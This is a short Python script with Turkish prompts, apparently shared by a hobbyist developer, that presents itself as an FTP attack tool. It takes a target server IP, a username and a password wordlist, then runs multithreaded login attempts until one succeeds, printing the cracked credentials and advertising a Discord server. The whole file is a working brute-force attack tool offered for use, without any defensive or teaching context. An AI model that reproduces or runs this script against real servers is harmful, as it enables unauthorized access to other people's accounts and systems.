from ftplib import FTP
import sys
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

bannerbebeim = """
██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗ ██████╗ ██╗  ██╗████████╗
██║    ██║██╔══██╗██╔══██╗████╗  ██║██║██╔════╝ ██║  ██║╚══██╔══╝
██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██║  ███╗███████║   ██║   
██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║   ██║██╔══██║   ██║   
╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║╚██████╔╝██║  ██║   ██║   
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
"""

print(Fore.YELLOW + bannerbebeim)
print(Fore.CYAN + Style.BRIGHT + "FTP saldırı uygulamasına hoş geldiniz!")
print(Fore.MAGENTA + "-" * 40)
print(Fore.LIGHTWHITE_EX + Style.BRIGHT + "Bu uygulama, FTP sunucusuna bağlanarak belirtilen şifrelerle giriş yapacaktır. Eğer giriş başarılı olursa program duracaktır.")
print(Fore.MAGENTA + "-" * 40)
print(Fore.LIGHTRED_EX + Style.BRIGHT + "Developer : Moriarty")
print(Fore.LIGHTBLACK_EX + Style.BRIGHT + "discord : onemoriarty")
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "github : onemoriarty")
print(Fore.MAGENTA + "-" * 40)

sunucu = input(Fore.GREEN + "FTP sunucusunun IP adresini gir > ")
isim = input(Fore.GREEN + "FTP sunucusunun kullanıcı adını gir : ")
kelimelistesi = input(Fore.GREEN + "FTP sunucusuna saldıracağın listeyi gir : ")

if isim == "":
    print(Fore.RED + "Kullanıcı adı girilmemiş.")
    sys.exit()
if sunucu == "":
    print(Fore.RED + "FTP sunucu girilmemiş.")
    sys.exit()

try:
    with open(kelimelistesi, 'r', encoding='utf-8', errors='ignore') as ftpşifreleri:
        wordlist = ftpşifreleri.read().splitlines()
except FileNotFoundError:
    print(Fore.RED + "Şifre listesi bulunamadı.")
    sys.exit()


def girişdenemesi(satır):
    try:
        ftpbaglantisi = FTP(sunucu)
        ftpbaglantisi.login(isim, satır)
        print(Fore.GREEN + Style.BRIGHT + f"Başarılı giriş bulundu, hadi gene iyisin hee :) Kullanıcı adı : {isim}, Şifre: {satır}")
        print(Fore.YELLOW + Style.BRIGHT + "Discord sunucumuz : https://discord.gg/QRppCpjvZc")
        print(Fore.CYAN + Style.BRIGHT + "Discord : onemoriarty")
        return True
    except Exception:
        print(Fore.RED + f"Başarısız giriş: Kullanıcı: {isim}, Şifre: {satır}")
        return False

with ThreadPoolExecutor(max_workers=10) as executor:
    blabla = executor.map(girişdenemesi, wordlist)
    
    for herdeneme in blabla:
        if herdeneme:
            print(Fore.GREEN + "Başarılı giriş bulundu, işlem tamamlandı")
            sys.exit()
            break
